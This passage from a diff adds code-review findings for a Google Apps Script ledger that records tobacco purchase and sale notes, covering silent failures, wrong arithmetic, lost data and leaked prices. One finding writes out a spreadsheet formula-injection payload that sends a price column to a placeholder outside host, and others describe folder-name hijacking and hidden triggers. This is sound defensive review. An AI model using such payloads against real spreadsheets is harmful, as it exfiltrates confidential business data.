+  "likelihood": "tinggi",
+  "fix": "In tulisDariJson_, loop with try/catch per nota, collect the failures, and throw once at the end listing which index failed — so already-written notas are skipped by cariNota_ on retry instead of aborting it.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "Every cekInbox rejection is invisible: the alert is swallowed and nothing reaches MASALAH",
+  "where": "lapor_ lines 65-68 (`try { SpreadsheetApp.getUi().alert(...) } catch (e) {}`); cekInbox lines 473-475 writes only to LOG via catat_; cekKualitas never reads LOG or the Gagal folder",
+  "scenario": "A nota is rejected as NOTA KEMBAR (line 304) or NOMOR SERI BENTROK (line 317). A time trigger has no UI, so getUi() throws and the catch eats it. The only record is a LOG row Aldi never opens, and MASALAH stays green because cekKualitas only inspects rows that were actually written. Aldi photographs a nota, sees no error, and believes it is booked. Weeks later he pays an agen from RINGKASAN totals that are missing that nota.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "tinggi",
+  "fix": "In cekInbox's catch, also append the failure to the MASALAH tab (or MailApp.sendEmail to Aldi) so a rejection shows up on a screen he actually looks at.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "angka_ is dead code, so \"57.500\" becomes Rp 57,5 and the arithmetic check still passes",
+  "where": "angka_ lines 81-85, never called; tulisNota_ lines 274-277 use raw `Number(t.bruto)`, `Number(t.harga)`; cekKualitas line 972",
+  "scenario": "The JSON carries the Indonesian-formatted price `\"harga\": \"57.500\"`. `Number(\"57.500\")` is 57.5, not 57500 — no NaN, no fallback. jumlah becomes netto x 57.5. cekKualitas line 972 recomputes netto x harga from the same wrong harga and finds them equal, so it reports nothing. TOTAL JUMLAH and DIBAYAR are 1000x too small. With `\"harga\": \"57,500\"` or `\"Rp 57.500\"` it is NaN, `|| 0` makes it 0, and the only complaint is a RINGAN 'HARGA kosong' (line 971).",
+  "consequence": "WRONG DATA",
+  "likelihood": "tinggi",
+  "fix": "Route every numeric field in tulisNota_ through angka_ (which already strips separators), and make angka_ treat a dot followed by exactly three digits as a thousands separator.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "A JSON null for tara, netto, harga or nilaiTara zeroes money and passes every quality check",
+  "where": "tulisNota_ lines 266, 275-277 (`t.tara !== undefined && t.tara !== ''` — null passes both, `Number(null)` is 0); cekKualitas lines 968-973",
+  "scenario": "Claude cannot read the tara on a photo and emits `\"tara\": null`. The guard only excludes undefined and empty string, so tara becomes 0 and netto becomes bruto. On a 500 kg nota at Rp 55.000 Aldi pays for 50 kg of stalk and dirt — about Rp 2,75 juta too much. cekKualitas checks `netto > bruto` (equal, passes), `bruto <= 0` (passes) and `netto x harga == jumlah` (both derived from the same numbers, passes). MASALAH stays clean. With `\"netto\": null` the roll is worth Rp 0, TOTAL JUMLAH is 0, DIBAYAR is negative, and again nothing is flagged because 0 x harga equals 0.",
+  "consequence": "WRONG DATA",
+  "likelihood": "tinggi",
+  "fix": "Change the guards to `t.tara != null && t.tara !== ''` (loose != catches both null and undefined), same for netto, and use `d.nilaiTara == null ? 0.1 : Number(d.nilaiTara)` at line 266.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "A missing jenisNota silently books a factory sale as a purchase, doubling the error in CUAN",
+  "where": "tulisNota_ line 330 (`d.jenisNota || 'BELI PETANI'`); petaSeri_ line 407 (`if (jenis[no] === 'JUAL PABRIK') return`); buatDashboard lines 795-798",
+  "scenario": "A JSON for an Om CK sale omits jenisNota, or writes it as 'Jual Pabrik'. Line 330 stores 'BELI PETANI'. Two things break at once: the DASHBOARD counts the sale's DIBAYAR as MODAL instead of counting TOTAL JUMLAH as OMSET, so CUAN is wrong by roughly twice the nota; and petaSeri_'s exact-string comparison no longer skips it, so the rolls' seri now collide with the buy-side nota they came from — the next sale of the same tobacco is rejected with NOMOR SERI BENTROK.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Throw when d.jenisNota is missing instead of defaulting, and compare with `.toUpperCase()` at line 407.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "tanggal_ turns an unreadable or missing date into today, and reads 7/5/2026 as 5 July",
+  "where": "tanggal_ lines 87-102, fallback at line 101 (`isNaN(d.getTime()) ? new Date() : d`); dd/mm regex at line 90",
+  "scenario": "The JSON omits `tanggal` or the handwriting was unreadable. `String(undefined)` is 'undefined', `new Date('undefined')` is Invalid, and line 101 stamps the nota with the day cekInbox happened to run. The nota is then filed in the wrong month on the DASHBOARD, falls inside or outside the 7/30/90-day filter wrongly, and its fingerprint (sidikNota_ line 374) no longer matches the same nota submitted on a different day, so the duplicate guard misses it. Separately, if Claude ever emits US format 7/5/2026, line 90 matches it as dd/mm and files a 5 July nota into May.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Throw `new Error('tanggal tidak terbaca: ' + s)` at line 101 instead of returning new Date(), so the file lands in Gagal rather than silently getting the wrong date.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "cekKualitas reads NOTA and ITEM in two separate calls, so a nota landing between them is reported as corrupt",
+  "where": "cekKualitas lines 947 and 948 (two separate getValues calls); trigger at 02:00 line 511, cekInbox every 5 minutes line 510",
+  "scenario": "cekInbox and cekKualitas both fire at 02:00 — this collision is guaranteed, not hypothetical, because 02:00 is a multiple of 5 minutes. cekKualitas snapshots NOTA at line 947. cekInbox writes ITEM rows (line 325) and then the NOTA row (line 351). cekKualitas snapshots ITEM at line 948 and now sees gulungan whose nota is not in its NOTA snapshot. It writes BERAT 'NO NOTA \"X\" tidak ada di tab NOTA' for every roll of that nota. Aldi wakes up to 40 red BERAT findings about data that is perfectly fine, and starts treating MASALAH as noise.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Take both snapshots under the same script lock as cekInbox, or move cekKualitas to 02:02 and shorten it to a single flush-guarded read.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "Manual row deletion in NOTA or ITEM leaves no trace anywhere, and an OUT row deletion is undetectable",
+  "where": "catatEdit lines 496-506 (onEdit only); cekKualitas lines 977-987 (`if (!out) { d.bruto += bruto; d.jumlah += jumlah; }`)",
+  "scenario": "Aldi (or anyone with edit access) right-clicks an ITEM row and deletes it. onEdit does not fire on row deletion, so LOG records nothing — despite nyalakanOtomatis promising 'Semua edit manual di NOTA & ITEM dicatat' (line 520). If the deleted row was an OUT roll, cekKualitas is also blind: OUT bruto and jumlah are excluded from both the NOTA totals (tulisNota_ line 281) and the reconciliation (line 978), so TOTAL BRUTO and TOTAL JUMLAH still balance. JUMLAH GULUNG and the OUT count in NOTA stay one too high forever, and OUT rolls are exactly the ones under dispute with the pabrik.",
+  "consequence": "LOST DATA",
+  "likelihood": "sedang",
+  "fix": "Add `ScriptApp.newTrigger('catatEdit').forSpreadsheet(...).onChange()` for structural changes, and reconcile the ITEM row count against JUMLAH GULUNG in cekKualitas (`if (d.n !== Number(g(r,'JUMLAH GULUNG'))) lapor('BERAT', ...)`).",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "A duplicate NO NOTA hides the first nota from every check and invents a false mismatch on the second",
+  "where": "cekKualitas lines 953-958 (`daftar[no] = {...}` overwrites) and lines 981-987",
+  "scenario": "Two rows in NOTA carry the number 'RA 7' (typed by hand, or written after a partial-write retry). Line 956 reports the duplicate once, then line 957 overwrites daftar['RA 7'] with the second row's accumulator. The first nota's totals are never checked at all. Every ITEM row of both notas accumulates into the second nota's counters, so line 984 reports BERAT 'TOTAL BRUTO tidak sama' against a row whose totals are actually correct. NOTA CETAK's VLOOKUP (line 896) also silently prints only the first of the two.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "At line 957, `if (daftar[no]) return;` after reporting, so the first row keeps the accumulator, and add the item count check so the real problem surfaces.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "hapusMigrasi deletes ITEM before NOTA one row at a time, and a timeout permanently blocks re-migration",
+  "where": "hapusMigrasi lines 641-653 (`sh.deleteRow(i + 2)` in a loop, ITEM at line 649 then NOTA at line 650); migrasiLama_ line 564 and migrasiPakMul_ line 611 (`if (cariNota_(nama) > 0) return 0`)",
+  "scenario": "Aldi re-runs hapusMigrasi to redo the migration. The ITEM pass issues one deleteRow API call per matching row; with a few hundred rolls this runs long and the 6-minute limit kills the execution partway. All or most ITEM rows are gone; the NOTA rows for MITA, YOHAN and PAK MUL are still there. He then runs migrasiDataLama again: cariNota_('MITA') finds the surviving NOTA row and returns 0 without importing anything. lapor_ says '0 nota masuk' and 'Tab lama tidak berubah', which reads like a harmless no-op. The three founding notas now exist with zero gulungan and cannot be rebuilt without hand-deleting rows.",
+  "consequence": "LOST DATA",
+  "likelihood": "sedang",
+  "fix": "Delete the NOTA rows first, then ITEM; and batch the deletion with a single getValues + rewrite of the surviving rows instead of one deleteRow per row.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "migrasiLama_ keeps only the LAST subtotal row, so every netto and every rupiah in a migrated nota is wrong",
+  "where": "migrasiLama_ lines 579-585 (`tBruto = bruto; tNetto = ...; tTara = ...` are assignments, not accumulations) and lines 597-598 (`taraPer = tTara / item.length`)",
+  "scenario": "The MITA or YOHAN tab has a subtotal line partway down the page and a grand total at the bottom (or a stray totals row under a signature). Each time the loop hits a row with a blank NO and a non-zero BRUTO it overwrites tTara. The last one wins. taraPer = tTara / item.length then spreads that wrong tara across every gulungan, so t.netto = bruto - taraPer is wrong for every roll, jumlah = netto x harga is wrong for every roll, and TOTAL JUMLAH and DIBAYAR are wrong for the whole nota. The CATATAN field records the wrong 'total asli' too (line 603), so the error is preserved as if it were the source of truth.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Take the subtotal row with the largest BRUTO, or only accept the last subtotal row when its BRUTO equals the sum of the item rows; otherwise log GAGAL and import nothing.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "migrasiLama_ charges the whole-nota ongkos to every gulungan, and lancelotSelfCheck asserts the opposite with literals",
+  "where": "migrasiLama_ lines 588 and 602 (`ongkos` becomes `ongkosPerGulung`); tulisNota_ lines 279 and 281 (`oT += ong` per IN item); lancelotSelfCheck line 1048",
+  "scenario": "The old MITA tab holds ONGKOS 10000 as the cost for the whole nota. migrasiLama_ passes it as ongkosPerGulung, and tulisNota_ adds it once per IN roll, so 23 rolls produce TOTAL ONGKOS 230.000 and DIBAYAR is Rp 220.000 short. Mita is underpaid. lancelotSelfCheck line 1048 checks `23 * 40000 - 10000 == 910000` — the per-nota formula — but it is plain literal arithmetic that never calls tulisNota_, hitungTara_ or anything else in the write path. It reports SEMUA BENAR while the production code does the other thing. The same is true of lines 1049, 1055 and 1056: they compare two literals and prove nothing about the code.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Make the self-check call tulisNota_'s arithmetic instead of restating it — extract the per-item loop into a pure function and assert on that.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "NOTA CETAK's confidentiality gate is one unprotected, sticky cell",
+  "where": "buatNotaCetak lines 890-893 (dropdown built without setAllowInvalid(false)); the guards at line 926 and line 930 test `$E$3=\"UNTUK AGEN\"`",
+  "scenario": "Aldi switches E3 to 'UNTUK SAYA' to check his margin on a nota. Nothing ever switches it back — buatNotaCetak only sets the default when the sheet is rebuilt (line 891). The next time he picks a nota in B3 and prints or screenshots the sheet for Mita, columns H-L show the pabrik's NETTO, HARGA and JUMLAH per roll and I8 shows CUAN. Separately, because the dropdown was built without setAllowInvalid(false), any typed value — including 'UNTUK AGEN ' with a trailing space — fails the equality test and reveals the same block while looking correct on screen.",
+  "consequence": "LEAKED DATA",
+  "likelihood": "sedang",
+  "fix": "Add `.setAllowInvalid(false)` to the E3 validation and invert the test to `=IF($E$3=\"UNTUK SAYA\", <secret>, \"\")` so anything other than an explicit 'UNTUK SAYA' hides the block.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "cekKualitas tells Aldi to fill AGEN on factory notas, which poisons RINGKASAN's per-agen payables",
+  "where": "cekKualitas line 994 (`if (!String(g(r,'AGEN')).trim()) lapor('RINGAN', dimana, 'AGEN kosong')`); buatTampilan RINGKASAN query lines 680-688 (`sum(DIBAYAR) ... group by AGEN`)",
+  "scenario": "Every JUAL PABRIK nota legitimately has no agen — the counterparty is Om CK, recorded in PABRIK. cekKualitas flags each one RINGAN 'AGEN kosong'. Aldi does what MASALAH asks and types 'MITA' into the AGEN column of a sale nota. RINGKASAN's `where AGEN is not null group by AGEN` now folds that sale's DIBAYAR into Mita's row, so the tab he uses to see what he owes Mita is inflated by the factory nota. The DASHBOARD's per-agen block (lines 799-803) picks it up too.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Skip the AGEN check when JENIS NOTA is JUAL PABRIK, and add `where JENIS NOTA = 'BELI PETANI'` to the RINGKASAN query.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "The DASHBOARD shows two different truths on one screen because half of it is a frozen snapshot",
+  "where": "buatDashboard lines 785-836 (static values written by script) and lines 838-855 (charts built from them) versus the live SUMPRODUCT cards at lines 764-781; nyalakanOtomatis lines 508-521 registers no trigger for buatDashboard",
+  "scenario": "Notas arrive through cekInbox every five minutes. The KPI cards at row 6 are formulas, so MODAL, OMSET and CUAN update immediately. The PER BULAN and PER AGEN tables at row 11 and both charts were written as literal values the last time someone manually ran buatDashboard, possibly weeks ago. Aldi reads Rp 40 juta of MODAL in the card and a chart underneath showing Rp 12 juta for the same month, and has no way to tell which is current. hapusMigrasi (line 641) makes it worse: deleted notas keep appearing in the tables and charts.",
+  "consequence": "WRONG DATA",
+  "likelihood": "tinggi",
+  "fix": "Either add buatDashboard to nyalakanOtomatis on a schedule, or replace the static block with QUERY formulas so it cannot drift.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "A numerically-numbered nota disappears from COMPILE and IN-OUT while still sitting in NOTA",
+  "where": "buatTampilan lines 669-678 (`=QUERY(...) where <NO NOTA> is not null`)",
+  "scenario": "Most nota numbers are text ('MITA', 'RA 7'). Aldi enters one as a bare number, e.g. 1234, and Sheets stores it as a number. Google Sheets QUERY assigns one type per column and returns blank for the minority type, so that cell comes back null. The `where NO NOTA is not null` filter then drops the row entirely: the nota vanishes from COMPILE and all its gulungan vanish from IN-OUT. NOTA and ITEM still hold the data, cekKualitas still passes it, and nothing reports the disappearance — the views he actually reads simply do not contain it.",
+  "consequence": "LOST DATA",
+  "likelihood": "sedang",
+  "fix": "Force text on the NO NOTA columns: `n.getRange(2, CN['NO NOTA'], nr, 1).setNumberFormat('@')` in pasangSheet, and `String(noNota)` is already applied on write.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "A file that is not exactly *.json sits in the Inbox forever, unprocessed and unlogged",
+  "where": "cekInbox line 472 (`if (f.getName().slice(-5).toLowerCase() !== '.json') continue;`) — the file is never moved and never logged",
+  "scenario": "A JSON arrives as 'nota-mita.json.txt', or Drive converts it, or the extension is missing. The continue skips it without moving it and without a catat_ entry. It is rescanned every five minutes forever, and both the Selesai and Gagal folders stay empty of it. Nothing on any tab indicates a nota is waiting. Meanwhile a run where the inbox is genuinely empty also writes nothing to LOG, so 'the trigger is dead' and 'nothing arrived' look identical — and matikanOtomatis (lines 523-525) sits in the same function dropdown as nyalakanOtomatis, deletes every trigger, and logs nothing at all.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "sedang",
+  "fix": "Move non-JSON files to Gagal with a catat_ entry, and have cekInbox write one LOG row per run (including empty runs) so a stopped trigger is visible as a gap.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "tambahan is folded into DIBAYAR but stored in no column, so the payment can never be reconciled",
+  "where": "tulisNota_ line 337 (`v[CN['DIBAYAR']] = jT - oT + (Number(d.tambahan) || 0)`); H_NOTA lines 31-37 has no TAMBAHAN column; migrasiPakMul_ line 629 records it only as free text",
+  "scenario": "The PAK MUL nota carries Rp 200.000 for contoh tembakau. DIBAYAR becomes TOTAL JUMLAH - TOTAL ONGKOS + 200.000. Three months later Aldi or an agen checks the arithmetic on that row: TOTAL JUMLAH minus TOTAL ONGKOS does not equal DIBAYAR and nothing on the row explains the gap except a sentence buried in CATATAN. cekKualitas never validates DIBAYAR at all (lines 981-995), so a wrong or malicious tambahan is arithmetically undetectable.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Add a 'TAMBAHAN' column to H_NOTA, write d.tambahan into it, and assert DIBAYAR == TOTAL JUMLAH - TOTAL ONGKOS + TAMBAHAN in cekKualitas.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "The photo link is written as an unescaped =IMAGE() formula and one quote destroys it",
+  "where": "tulisNota_ lines 343-344 (`'=IMAGE(\"' + d.linkNota + '\")'`)",
+  "scenario": "A Drive share URL contains a double quote or the JSON carries a caption instead of a bare URL. The concatenated string is no longer a valid formula, so the cell shows #ERROR! and the URL text is not recoverable from it — the only pointer to the photo of the handwritten nota is gone, and the same applies to LINK BUKTI TRANSFER, the proof that a supplier was paid. cekKualitas line 991 checks only that the cell is non-empty, and a broken formula is non-empty, so it reports nothing.",
+  "consequence": "LOST DATA",
+  "likelihood": "rendah",
+  "fix": "Store the raw URL in the cell and use a separate display column, or at minimum reject a linkNota containing `\"` before building the formula.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "pasangSheet issues 1500 individual setBackground calls and can die mid-setup with no error and no log",
+  "where": "rapi_ line 192 (`for (var b = 3; b <= n + 1; b += 2) sh.getRange(b,1,1,lebar).setBackground(...)`) called from line 156 with n = 3000; warnaKolom_ lines 207-215",
+  "scenario": "pasangSheet builds ITEM with 3000 rows, so rapi_ loops 1500 times issuing one range operation each, on top of NOTA's 200 and the four master tabs. The execution can exceed the 6-minute limit. When it does, the script simply stops: the masters are never seeded, pasangValidasiMaster_ never runs, catat_('pasangSheet','OK') at line 179 never fires, and no alert appears. Aldi moves on to step 3 of the setup with an ITEM tab that has no IN/OUT validation and no number formats. Separately, every successful re-run of pasangSheet pushes another copy of the LUNAS and IN/OUT rules into the conditional format list (line 211) instead of replacing them.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "sedang",
+  "fix": "Replace the loop with one banding call (`sh.getRange(2,1,n,lebar).applyRowBanding()`), and in warnaKolom_ use setConditionalFormatRules on a filtered list rather than pushing onto the existing one.",
+  "_lens": "v2:b240527a75ce96603d8a636ab1a75b0b82be22e57ef0fdbc6c84586f5c62c75e"
+ },
+ {
+  "title": "NOTA CETAK's secrecy gate fails OPEN — any value in E3 that isn't exactly \"UNTUK AGEN\" reveals the pabrik prices",
+  "where": "buatNotaCetak, lines 891-893 (dropdown), 925-927 (H12 pabrik block), 930-933 (I8 CUAN)",
+  "scenario": "Aldi opens NOTA CETAK to show Mita her nota, taps E3 and presses Delete (or leaves a trailing space, or types \"agen\"). The formulas are `=IF($E$3=\"UNTUK AGEN\",\"\",<secret>)`, so an empty or misspelled E3 is NOT \"UNTUK AGEN\" and H12 immediately fills with NO/SERI/NETTO/HARGA/JUMLAH from the pabrik side, and I8 shows the cuan. The dropdown at line 893 calls `requireValueInList(...).build()` with no `setAllowInvalid(false)`, so free typing is permitted and nothing blocks it.",
+  "consequence": "LEAKED DATA",
+  "likelihood": "tinggi",
+  "fix": "Invert both formulas to fail closed — `=IF($E$3=\"UNTUK SAYA\",<secret>,\"\")` — and add `.setAllowInvalid(false)` to the E3 validation on line 893.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "The mode gate covers one tab; six other visible tabs carry the same pabrik numbers, and no sheet is ever protected or hidden",
+  "where": "whole file — no `.protect()` / `hideSheet()` anywhere; H_ITEM line 38-42, COMPILE line 669-673, RINGKASAN line 680-688, DASHBOARD CUAN line 767, MASALAH text line 973, LOG line 503-504",
+  "scenario": "Aldi shares the spreadsheet with an agen (view or edit) so she can see NOTA CETAK. She clicks the ITEM tab and reads HARGA and JUMLAH per gulungan for every nota including JUAL PABRIK ones; RINGKASAN shows every other agen's gulungan, netto and DIBAYAR side by side; DASHBOARD shows CUAN; MASALAH quotes prices inside its finding text ('JUMLAH salah: 115 x 42000 ='); LOG stores every manual price edit as a plain \"old -> new\" string. Sheet protection would not help either — protection stops editing, not reading.",
+  "consequence": "LEAKED DATA",
+  "likelihood": "tinggi",
+  "fix": "Never grant an agen access to the file. Deliver the A10:F block as a PDF/print export only, and treat NOTA CETAK's mode as a reminder for Aldi's own screen, not as access control.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "B3 and E3 are single shared cells — one screen change reveals the pabrik block on everyone else's screen live",
+  "where": "buatNotaCetak, lines 886-893 (B3 nota picker, E3 mode)",
+  "scenario": "Aldi sets E3 to UNTUK AGEN and hands his phone to Yohan. On his laptop (or during the hours the file was world-editable, anyone with the link) someone selects a different nota or flips the mode to UNTUK SAYA. Sheets pushes the change to every open viewer within a second, so the pabrik harga block appears on the phone in Yohan's hands. There is one global state cell, not a per-viewer filter.",
+  "consequence": "LEAKED DATA",
+  "likelihood": "sedang",
+  "fix": "Same as above — export a PDF of the agen block instead of showing the live sheet. If the live sheet must be shown, use a Filter View or a separate one-nota export sheet, never a shared control cell.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "Drive folders are resolved BY NAME, so a folder someone else shares with Aldi captures the weekly full-ledger backup",
+  "where": "folder_ lines 480-483; backupMingguan lines 486-493; cekInbox line 473",
+  "scenario": "`DriveApp.getFoldersByName('Lancelot-Backup')` searches everything the account can see, including 'Shared with me'. Anyone who creates a folder with that exact name and shares it with Aldi's Google account can win the `it.next()` race. `backupMingguan` then runs `makeCopy` of the ENTIRE spreadsheet — every harga pabrik, every cuan — into a folder that person owns, every Sunday at 01:00, forever, and Aldi cannot revoke a copy that lands in someone else's Drive. The same trick against 'Lancelot-Inbox' feeds attacker-written JSON straight into `tulisNota_`; against 'Lancelot-Selesai' it harvests every processed nota file.",
+  "consequence": "LEAKED DATA",
+  "likelihood": "sedang",
+  "fix": "Replace the four name constants (lines 23-24) with hard-coded folder IDs and use `DriveApp.getFolderById`; delete `folder_`'s create-if-missing fallback so a wrong ID throws instead of silently making a new folder.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "Lancelot-Selesai and Lancelot-Backup are a permanent, unpruned plaintext archive of every pabrik price",
+  "where": "cekInbox line 473 (`f.moveTo(selesai)`); backupMingguan line 490 (`makeCopy`, never pruned)",
+  "scenario": "Every JSON Claude writes contains the full nota including `harga` for JUAL PABRIK notas, and it is kept forever in Lancelot-Selesai. Every Sunday a complete copy of the spreadsheet is added to Lancelot-Backup, and a copy inherits the sharing of the folder it is created in. If either folder was shared to let a helper drop photos — or was reachable during the world-editable window — the whole price history is readable there, and locking down the spreadsheet later changes nothing because these are separate Drive objects with their own permissions.",
+  "consequence": "LEAKED DATA",
+  "likelihood": "sedang",
+  "fix": "Audit the sharing on all four folders now, keep only the last 8 backups (delete older ones in `backupMingguan`), and have `cekInbox` delete the JSON after a successful write instead of archiving it.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "While the file was world-editable the bound Apps Script was editable too — foreign triggers survive and are invisible to Aldi",
+  "where": "SPREADSHEET_ID line 21; nyalakanOtomatis lines 508-521; matikanOtomatis line 524",
+  "scenario": "A container-bound script is editable by anyone with edit access to the sheet. During the open window anyone could open Extensions > Apps Script, read SPREADSHEET_ID, add a function that mails ITEM to themselves, and install it as a time trigger — triggers are per-user, so `ScriptApp.getProjectTriggers()` (line 524) returns only Aldi's own and `matikanOtomatis` cannot delete theirs, nor can Aldi see them listed. They could equally have run `hapusMigrasi` (line 641) or `bersihkanTabLama` (line 238) from the Run menu, or simply made a private copy of the spreadsheet, which no permission change can revoke. Version history also retains every price ever typed for anyone who still holds edit rights.",
+  "consequence": "LEAKED DATA",
+  "likelihood": "sedang",
+  "fix": "Treat the current file as burned: make a fresh copy, paste the script into a NEW standalone project with a new ID, share the new file with named accounts only, then check the old file's Version history and Drive activity for edits by unknown accounts.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "Inbox JSON is written straight into cells, so a value starting with `=` becomes a live formula and can call out to the internet",
+  "where": "tulisNota_ lines 343-344 (string-concatenated `=IMAGE(\"...\")`), 325 and 351 (`setValues`)",
+  "scenario": "Anyone who can put a file in Lancelot-Inbox (world-editable window, or the name-collision folder above) supplies `catatan: '=IMAGE(\"https://x.example/\"&TEXTJOIN(\",\",1,ITEM!K:K))'`. `setValues` stores a leading-`=` string as a formula, the sheet fetches that URL under Aldi's session, and every harga in column K leaves in the query string. Non-malicious version: a legitimate Drive link containing a `\"` breaks `'=IMAGE(\"' + d.linkNota + '\")'` on line 343 into `#ERROR!` and the bukti transfer link is lost with no warning.",
+  "consequence": "LEAKED DATA",
+  "likelihood": "sedang",
+  "fix": "Strip a leading `=`, `+`, `-`, `@` from every string field before pushing it into `rows`/`keluarN`, and reject any `linkNota`/`linkTransfer` containing a quote instead of concatenating it into a formula.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "`angka_` is dead code — \"57.500\" becomes 57.5 and the arithmetic check still passes",
+  "where": "angka_ defined line 81, never called; tulisNota_ lines 274-278 use raw `Number(t.harga)`",
+  "scenario": "Claude reads a handwritten Rp 57.500 and writes `\"harga\": \"57.500\"`. `Number(\"57.500\")` is 57.5, so `jumlah = netto * 57.5` (line 278) and DIBAYAR (line 337) come out roughly a thousand times too small. `cekKualitas`'s only money rule is `netto * harga == jumlah` (line 972) and it PASSES, because the row is internally consistent — just consistently wrong. Mirror case: `\"bruto\": \"40,5\"` gives NaN, `|| 0` turns it into 0, and the gulungan is recorded weighing nothing.",
+  "consequence": "WRONG DATA",
+  "likelihood": "tinggi",
+  "fix": "At the top of `tulisNota_`, reject the whole nota (throw, so the file lands in Lancelot-Gagal) if any bruto/harga/tara/netto arrives as a string containing `.` or `,` — do not guess the separator.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "An unparseable date is silently replaced with today, which also corrupts the duplicate fingerprint",
+  "where": "tanggal_ lines 87-102, fallback `return isNaN(d.getTime()) ? new Date() : d` on line 101",
+  "scenario": "A nota dated 25-07-2026 (dashes — the normal Indonesian handwritten form) matches neither regex on lines 90 and 92, `new Date(\"25-07-2026\")` is Invalid, so line 101 stamps TODAY. The nota is filed under the wrong month in COMPILE and the DASHBOARD period filter; worse, `sidikNota_` (line 374) keys on that date, so the same photo submitted on two different days produces two different fingerprints and both copies are written, while two genuinely different notas that both fail to parse on the same day can collide and one gets rejected as NOTA KEMBAR.",
+  "consequence": "WRONG DATA",
+  "likelihood": "tinggi",
+  "fix": "Add the dash pattern to the regex on line 90 and make line 101 throw instead of returning `new Date()`, so a bad date sends the file to Lancelot-Gagal rather than into the ledger.",
+  "_lens": "v2:8476f58939dff5647cb9e1875ca9f088e70e841048c1466fc90809f5110fe8e5"
+ },
+ {
+  "title": "No lock anywhere — two overlapping trigger runs compute the same target row and overwrite each other's gulungan",
+  "where": "cekInbox trigger every 5 min line 510; tulisNota_ line 323 (`awal = shI.getLastRow() + 1`) and line 349 (`br = shN.getLastRow() + 1`); no LockService in the file",
+  "scenario": "Aldi drops six nota JSONs at once. Run A is still inside the loop when the 5-minute trigger starts run B. Both call `getLastRow()` and get the same number, both `setValues` at that row, so B's gulungan land on top of A's. The NOTA tab still holds A's row claiming its own JUMLAH GULUNG and TOTAL BRUTO, but A's gulungan are gone. Nothing notices until `cekKualitas` at 02:00 reports a TOTAL BRUTO mismatch — after the agen has been paid.",
+  "consequence": "LOST DATA",
+  "likelihood": "sedang",
